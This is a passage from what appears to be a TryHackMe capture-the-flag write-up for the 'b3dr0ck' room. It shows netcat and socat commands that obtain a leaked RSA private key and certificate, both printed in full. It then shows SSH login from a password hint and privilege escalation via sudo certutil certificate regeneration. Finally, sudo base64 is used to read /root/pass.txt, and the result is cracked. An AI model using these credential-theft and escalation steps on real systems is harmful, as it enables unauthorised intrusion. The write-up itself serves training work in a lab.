    00b0 - f6 fe 80 20 54 8d 7a 51-ab 3b 3e d3 2c 78 47 aa   ... T.zQ.;>.,xG.
    00c0 - b3 f2 28 bd 07 a5 af 14-1a 05 5d a6 b9 86 c4 8a   ..(.......].....

    Start Time: 1661764824
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
read:errno=0

so I tried to do more recon:

[ terra2 ~/b3dr0ck ]# nc ip 9009


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|



What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA20E+8Q3fYV6Pu66LgLyi4mvNhwwbZs16pQVanabKip0eB2e7
j5lFjPiv2gojcmwCbocp3B7AVbh9sFJgkKe7TjNV+ptv79XT1Ajf/mmA0n+uu/um
4NBO6Ko5Ztk4hMUfG4FL4zeFMdcM/2vVFi/T0frKWB2hNpdkFB0xlm+ZMCufnqTy
7/qfCwJF94vUT86IAClm8Gd2Z93iR15PFagPkRO3EOgeQU+GZQdLID/TDHD4Y7Ib
c4B7S4/C3Ga35d1YyHxG810sByJv4ZXDu10VVlq10XpPq9r69H6G/1aTWiIjt+zC
50ZAkbFPUBwgdcp4oc01WWvNfK3l1QbSINH7rwIDAQABAoIBAH0DA5c/2KjU2NEj
IUlixOCipMomXg1MhWxH1DXlXsCP+wov3CJxOtW5CdMhSrq32N8aVAS8x99YVNnO
7l4sNMDOxmwgaj9uRNw1vzl5AEmFIaTvRGQUgZlpTVdV7ULOfgEZxKImCtyzCCcu
XY3L8VNdUjfRlRTiVt6dEqP6t3Zdqs7GvtfZj0nqJPnv0++L0v+Sylh0c6nU2i65
BCpsSc2adyv4o/8fu2hrIZUIvMG14e2hZSLxbihd+6eSwqJPqeyOC9qNYD2+N7O2
MBYCuf6i8q3wv5iSdddYSUQuxAmG7Ge4ovnDynMWrQNvcMukfac6go/xkmteHrZD
6leId6ECgYEA9Svkd8CHcXCH13iNzdprgr1JDs4kpk0BVAcJ3CJv37QUwoAAEfSi
3yaqN20X+/+qz6OhgFLUWUUz72Mmr/4K43fO4hINg9UJAWnWLxdRGJyAgNhJuvia
yCipBY+Y1GgD0u7MXlX/VvEcWSw5GtJ+TVNH7yYai+qBZ7l4zsjkhP8CgYEA5PBR
xa993x2TSaToKGcK4tGXGeXig9MIUc0hKdjm3U2Tc5f4l+V5LaiTxmm3yz/dOpYu
xbl/9Qr0aR2N0Lh1l4G+f4T455f9l86VyMZ5ZacizC6KymqaTmuvyzDV3dr2YbsD
ZRCakXoLWjDfhQRttZ9t67P1AWJ8xYv+zZ15GVECgYBNtBqWBbQntPWoyfGPk7FN
X3afNaCSAIfyPMTYOyXf7bBCsNTU3Ace2J9ML8xRNwfJBWBzTk00+eTq8y7Yyphi
3Z75MaWM6eEPzJ5wkGBIf5mOvH4pvw83bwOa2pcigtDrcnndUD48LPDCJmz23k3f
bgy3dAkn3SwkVrk+OJeMuwKBgAF4fb38W52kTf7qHUetKce9OvBCpsrb/zCvVag0
KX+AcRMMBd/L7JRbgd+DbFfU6DHpJxHEGEtVr65BL1kI5lB71+Jv0z2Bn3JrNFEe
3UbG5RVUszWLq8QXMwDmJmmPb4e/MM1kZunKU+pXaAgtuBqzlHwwIsHIhS6rsI5X
laCRAoGAci+uzB4klCf99qVDbs7VkcBgDEKN3XUG91eINgUSI3HlYBZkT5SXCqIv
W9PVtvE6XKOzhAi563IJ43MVYO9B1FxeYaW/E9v6+Ui4eTyvmc93zoThD17PDTbM
S9CtTjqvbIP4QuWdXphU5CVkpGMt4Nmb+81ubQzHRNX/gDt9/j4=
-----END RSA PRIVATE KEY-----


What are you looking for? client
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MjkwODM4MDNaFw0yMzA4MjkwODM4MDNaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDbQT7x
Dd9hXo+7rouAvKLia82HDBtmzXqlBVqdpsqKnR4HZ7uPmUWM+K/aCiNybAJuhync
HsBVuH2wUmCQp7tOM1X6m2/v1dPUCN/+aYDSf667+6bg0E7oqjlm2TiExR8bgUvj
N4Ux1wz/a9UWL9PR+spYHaE2l2QUHTGWb5kwK5+epPLv+p8LAkX3i9RPzogAKWbw
Z3Zn3eJHXk8VqA+RE7cQ6B5BT4ZlB0sgP9MMcPhjshtzgHtLj8LcZrfl3VjIfEbz
XSwHIm/hlcO7XRVWWrXRek+r2vr0fob/VpNaIiO37MLnRkCRsU9QHCB1ynihzTVZ
a818reXVBtIg0fuvAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAMef2f1BRZ/xzKnv
ptpz7MHYh6/gjbRSS8zH57SfoANZD/PoFJV0EyLfkXfiRxsq513wwxuNQlKnmbz9
JM5X5C6DJE8Gedr7XgeMv5vh5so9I9EinAR0COWXpnZGvNunP23ks0qI4LuN+sCS
ImHSj1Oq9RYSSMlAVQ+ExJT+MtQxgSBLJ0ncpwkalZY6b37EfM9fDSAWGEpM/qLg
n48VEKx4MI19MFIZd1PAmta1gkMH9k6Vr5yr9LsZl3UC53DUXhm6tyrJnOoxRKoL
880nLv8gkurorvIg4lT1Hq3eTOewlhFgcJC0NiS6PR3b4bB2FNC72IklHSJ0EMrW
ET4LC9s=
-----END CERTIFICATE-----

yabbadabbado finally something useful


[ terra2 ~/b3dr0ck ]# socat stdio ssl:ip:54321,cert=/root/b3dr0ck/c,key=/root/b3dr0ck/rsa,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> ls
Unrecognized command: 'ls'

This service is for login and password hints
b3dr0ck> help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 

First I thought the hint was a md5 hash but you can just copy paste it into ssh
[ terra2 ~/b3dr0ck ]# ssh barney@ip

from here on the rest is relatively easy

I first tried to exploit Sudo-1.8.31 but it didnt work.
after that i just viewed my sudo perms:
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney: 
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil

when you just run this
barney@b3dr0ck:~$ sudo /usr/bin/certutil

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]

so you can list the certificates and just overwrite the fred ones:
barney@b3dr0ck:~$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30 21:54 .
drwxrwxr-x 8 root root 4096 Apr 29 04:30 ..
-rw-r----- 1 root root  972 Aug 29 15:20 barney.certificate.pem
-rw-r----- 1 root root 1674 Aug 29 15:20 barney.clientKey.pem
-rw-r----- 1 root root  894 Aug 29 15:20 barney.csr.pem
-rw-r----- 1 root root 1678 Aug 29 15:20 barney.serviceKey.pem
-rw-r----- 1 root root  976 Aug 29 15:20 fred.certificate.pem
-rw-r----- 1 root root 1674 Aug 29 15:20 fred.clientKey.pem
-rw-r----- 1 root root  898 Aug 29 15:20 fred.csr.pem
-rw-r----- 1 root root 1678 Aug 29 15:20 fred.serviceKey.pem

barney@b3dr0ck:/usr/share/abc/dist$ sudo /usr/bin/certutil "Fred" "Fred Flintstone"
Generating credentials for user: Fred (Fred Flintstone)
Generated: clientKey for Fred: /usr/share/abc/certs/Fred.clientKey.pem
Generated: certificate for Fred: /usr/share/abc/certs/Fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
[REDACTED]
-----END CERTIFICATE-----

Now that we have overwritten the original certificates of fred we can login to the YabbaDabbaDo service and get the creds:
terra2 ~/b3dr0ck ]# socat stdio ssl:ip:54321,cert=/root/b3dr0ck/fred.client,key=/root/b3dr0ck/fred.rsa,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Fred Flintstone' is authorized.
b3dr0ck> help
Password hint: [Redacted] (user = 'Fred Flintstone')
b3dr0ck> 

you can just ssh in with those creds (obvious the user is fred not Fred Flintstone this is only the owner of the certificate)

fred@b3dr0ck:/usr/share/abc/dist$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt

fred@b3dr0ck:/usr/share/abc/dist$ sudo /usr/bin/base64 /root/pass.txt | base64 -d
L[REDACTED]K

putting this in cyberchef gives an md5 hash
and crackstation cracks this md5 and gives us the password in plaintext
fred@b3dr0ck:/usr/share/abc/dist$ su - root
Password: 
root@b3dr0ck:~# cat /root/root.txt
THM{REDACTED}


